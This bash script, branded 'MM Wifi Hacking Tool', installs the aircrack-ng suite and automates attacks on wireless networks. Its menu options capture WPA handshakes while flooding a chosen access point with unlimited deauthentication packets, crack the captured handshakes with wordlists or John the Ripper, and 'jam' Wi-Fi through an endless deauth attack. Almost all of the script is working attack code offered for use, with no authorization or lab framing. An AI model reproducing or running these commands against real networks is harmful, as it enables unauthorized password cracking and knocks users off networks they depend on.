#MM
#www.youtube.com/MM Tech Tutorials
#www.facebook.com/mmTechTutorials	#page
#Mr. Malware Hacks

echo -e "\e[31mLoding........." ;
bar="-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*"
    barlength=${#bar}
    i=0
    while ((i < 100)); 
	do
        n=$((i*barlength / 100))
      printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.10
   done


exit=0
mkdir /root/MM/
clear
if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root."$transparent""
        exit 1
fi
#########################
echo -ne "\e[1;32mXterm...................."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mInstalling ..."$transparent
	  apt-get --yes install xterm
	else
    echo -e "\e[1;32mDone!"$transparent
	fi
	sleep 0.20
##################
################################################################
echo -ne "\e[1;32mAircrack-ng...................."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mInstalling ..."$transparent
	 xterm  -title "Installing Aircrack-ng" -e apt-get --yes install aircrack-ng
	else
    echo -e "\e[1;32mDone!"$transparent
	fi
	sleep 0.20
###########################################################################
echo -ne "Aireplay-ng...................."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mInstalling ..."$transparent""
		xterm  -title "Installing Aireplay-ng" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e apt-get --yes install aireplay-ng
	else
		echo -e "\e[1;32mDone!"$transparent
	fi
	sleep 0.20
###################################################################################
echo -ne "Airmon-ng...................."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mInstalling ..."$transparent""
		xterm -title "Installing Airmon-ng" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e apt-get --yes install airmon-ng
	else
		echo -e "\e[1;32mDone!"$transparent
	fi
	sleep 0.20
#############################################################################
echo -ne "Airodump-ng...................."
if ! hash airodump-ng 2>/dev/null; then
	echo -e "\e[1;31mInstalling ..."$transparent""
	xterm $HOLD -title "Installing Airodump-ng" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e apt-get --yes install airodump-ng
else
	echo -e "\e[1;32mDone!"$transparent""
fi
sleep 1.0
clear
airmon-ng start wlan0	#Command
clear
###################################################################################################
 
echo -e "\E[1;33m:::::::::::::::::::::\e[97mMM Wifi Hacking Tool\e[97m \E[1;33m:::::::::::::::::::::"

echo -e "[1]Auto Crack"
echo -e "[2]Crack A Handshake File"
echo -e "[3]Crack a Handshake File with John"
echo -e "[4]WIFI Jamming" 
echo -e "[5]Exit"
read -p '#>: ' option
case $option in

1)
echo -e "Starting Monitormode"
airmon-ng start wlan0
echo -e "Ctrl+C For Stop"
airodump-ng wlan0mon
read  -p 'Enter BSSID: ' bssid;read -p 'Inter Channel No.:' ch
echo -e ""
echo -e "When Handshake Found, Ctrl+C"

xterm -title "Airodump-ng" -geometry 68x25-0+0 -e airodump-ng --bssid $bssid -c $ch -w /root/MM/ wlan0mon&xterm -e aireplay-ng -0 0 -a $bssid wlan0mon
xterm -e aireplay-ng -0 0 -a $bssid wlan0mon
read -p 'Enter Wordlist Path:' wd
clear
echo -e ""
aircrack-ng -a2 -b $bssid -w $wd /root/MM/*.cap
airmon-ng stop wlan0mon
;;

2)

read -p 'Enter Handshake file Path: ' path
read -p 'Enter WordList Path: ' wd
read -p 'Enter BSSID: ' bssid
aircrack-ng -a2 -b $bssid -w $wd $path
;;
3)
read -p 'Enter Handshake file Path: ' path
aircrack-ng  $path -J /root/MM/mm
clear
echo -e ""
echo -e ""
echo -e ""

read -p 'Where you want to save hash: ' hash
read -p 'Type The Name of hash file: ' file
hccap2john /root/MM/mm.hccap > $hash$file
clear
john $hash$file
;;
4)
echo -e "Starting Monitormode"
airmon-ng start wlan0
echo -e "Ctrl+C For Stop"
airodump-ng wlan0mon
read  -p 'Enter BSSID: ' bssid;read -p 'Inter Channel No.:' ch
echo -e ""
echo -e "Press Ctrl+C for STOP"
xterm -title "Airodump-ng" -geometry 68x25-0+0 -e airodump-ng --bssid $bssid -c $ch -w /root/MM/ wlan0mon&xterm -e aireplay-ng -0 0 -a $bssid wlan0mon -e exit
xterm -e aireplay-ng -0 0 -a $bssid wlan0mon
;;
5)
airmon-ng stop wlan0mon
clear
exit=0

;;
esac



















